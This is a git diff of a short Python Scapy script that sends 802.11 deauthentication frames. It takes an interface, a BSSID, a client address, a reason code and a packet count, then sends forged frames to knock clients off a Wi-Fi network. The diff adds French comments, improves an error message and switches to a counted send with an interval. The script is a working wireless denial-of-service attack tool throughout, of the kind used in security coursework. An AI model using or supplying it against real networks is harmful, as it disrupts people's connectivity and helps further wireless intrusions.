@@ -1,6 +1,7 @@
 from scapy.all import conf, sendp
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 
+# Boucle infinie pour relancer le script (par commodité)
 while(True):
     interface = input("Define interface :\n")
     bssid = input("Enter BSSID :\n")
@@ -14,6 +15,8 @@ while(True):
     codeReason = input("Reason code :\n")
     codeReason = int(codeReason)
     
+    # Ici on définit le sens des reason codes selon ce qui est choisi par l'utilisateur
+    # Le 1 pourrait aller dans les 2 sens selon nos recherches mais ce sens fonctionne très bien
     if(codeReason == 1):
         src = bssid
         dst = client
@@ -31,11 +34,11 @@ while(True):
         dst = bssid
 
     else:
-        print("Error")
+        print("Error, bad reason code")
         break
 
+    # On construit notre paquet de Deauth
     dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
     packet = RadioTap()/dot11/Dot11Deauth(reason=codeReason)
-
-    for n in range(int(deauthNumber)):
-        sendp(packet, iface=interface)
+    # On envoit le paquet n fois (demandé à l'utilisateur)
+    sendp(packet, iface=interface, inter=0.5,count=int(deauthNumber))
